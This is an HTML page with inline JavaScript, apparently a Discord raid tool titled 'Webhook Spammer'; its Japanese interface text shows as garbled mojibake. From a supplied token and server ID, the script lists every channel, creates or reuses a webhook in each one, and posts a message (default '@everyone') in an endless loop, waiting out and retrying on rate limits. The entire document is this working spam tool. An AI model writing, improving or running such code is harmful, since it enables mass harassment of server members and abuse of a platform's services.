<h2>Webhook Spammer</h2>
<form id="form">
  <label>
    Token:
    <input type="text" id="token" required placeholder="Webhookä½œæˆç”¨ã®ãƒˆãƒ¼ã‚¯ãƒ³">
  </label>
  <label>
    ã‚µãƒ¼ãƒãƒ¼ID:
    <input type="text" id="guildId" required placeholder="1362131922347622462">
  </label>
  <label>
    Webhookå:
    <input type="text" id="webhookName" placeholder="Captain Hook">
  </label>
  <label>
    ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸å†…å®¹:
    <textarea id="message" placeholder="@everyone"></textarea>
  </label>
  <div class="button-container">
    <button type="submit" id="submitBtn" class="primary">å®Ÿè¡Œ</button>
    <button type="button" id="stopBtn" class="secondary">åœæ­¢</button>
  </div>
</form>
<div id="log" style="white-space: pre-wrap; max-height: 300px; overflow-y: auto;"></div>

<script>
let stopSpam = false;

// ãƒ­ã‚°å‡ºåŠ›
function log(msg) {
  const logEl = document.getElementById("log");
  logEl.textContent += `\n${new Date().toLocaleTimeString()} - ${msg}`;
  logEl.scrollTop = logEl.scrollHeight;
}

// Webhooké€ä¿¡
async function spamWebhook(url, message) {
  while(!stopSpam){
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      });

      if(res.status === 429){ // ãƒ¬ãƒ¼ãƒˆåˆ¶é™
        const data = await res.json();
        log(`â³ ãƒ¬ãƒ¼ãƒˆåˆ¶é™: ${data.retry_after}s`);
        await new Promise(r => setTimeout(r, data.retry_after * 1000));
      } else if(res.status >= 200 && res.status < 300){
        log("âœ… é€ä¿¡æˆåŠŸ");
      } else {
        log(`âŒ é€ä¿¡å¤±æ•—: status ${res.status}`);
        break;
      }
    } catch(e) { log(`âŒ é€ä¿¡ã‚¨ãƒ©ãƒ¼: ${e.message}`); }
  }
}

// Webhookä½œæˆ
async function createWebhook(token, channelId, webhookName, message){
  const headers = { Authorization: token, 'Content-Type': 'application/json' };

  try {
    const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/webhooks`, { headers });
    if(res.status === 429){
      const data = await res.json();
      log(`â³ å–å¾—ãƒ¬ãƒ¼ãƒˆåˆ¶é™: ${data.retry_after}s`);
      await new Promise(r => setTimeout(r, data.retry_after * 1000));
      return createWebhook(token, channelId, webhookName, message);
    }

    const webhooks = await res.json();
    const existing = webhooks.find(w => w.name === webhookName);

    if(existing){
      log(`ğŸ”„ æ—¢å­˜Webhookæ¤œå‡º: ${existing.url}`);
      spamWebhook(existing.url, message);
      return;
    }

    // æ–°è¦Webhookä½œæˆ
    const createRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/webhooks`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ name: webhookName })
    });

    if(createRes.status === 429){
      const data = await createRes.json();
      log(`â³ ä½œæˆãƒ¬ãƒ¼ãƒˆåˆ¶é™: ${data.retry_after}s`);
      await new Promise(r => setTimeout(r, data.retry_after * 1000));
      return createWebhook(token, channelId, webhookName, message);
    }

    const newWebhook = await createRes.json();
    log(`ğŸš€ Webhookä½œæˆ: ${newWebhook.url}`);
    spamWebhook(newWebhook.url, message);

  } catch(e){
    log(`âŒ ä½œæˆå¤±æ•—: ${e.message}`);
  }
}

// ãƒ¡ã‚¤ãƒ³å‡¦ç†
async function main(token, guildId, webhookName, message){
  stopSpam = false;
  try {
    log("ğŸ”„ ãƒãƒ£ãƒ³ãƒãƒ«å–å¾—ä¸­...");
    const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, { headers: { Authorization: token } });
    const channels = (await res.json()).map(c => c.id);
    log(`ğŸ”€ å¯¾è±¡ãƒãƒ£ãƒãƒ«: ${channels.join(", ")}`);

    for(const id of channels){
      if(stopSpam) break;
      createWebhook(token, id, webhookName, message);
    }
  } catch(e){
    log(`âŒ ${e.message}`);
  }
}

// ãƒœã‚¿ãƒ³æ“ä½œ
document.getElementById("form").addEventListener("submit", e => {
  e.preventDefault();
  const token = document.getElementById("token").value.trim();
  const guildId = document.getElementById("guildId").value.trim();
  const webhookName = document.getElementById("webhookName").value.trim() || "OZEU Webhook Spam";
  const message = document.getElementById("message").value.trim();

  const btn = document.getElementById("submitBtn");
  btn.disabled = true;
  btn.textContent = "å®Ÿè¡Œä¸­...";

  main(token, guildId, webhookName, message);
});

document.getElementById("stopBtn").addEventListener("click", () => {
  stopSpam = true;
  log("ğŸ›‘ åœæ­¢ã—ã¾ã—ãŸ");
  const btn = document.getElementById("submitBtn");
  btn.disabled = false;
  btn.textContent = "å®Ÿè¡Œ";
});
</script>
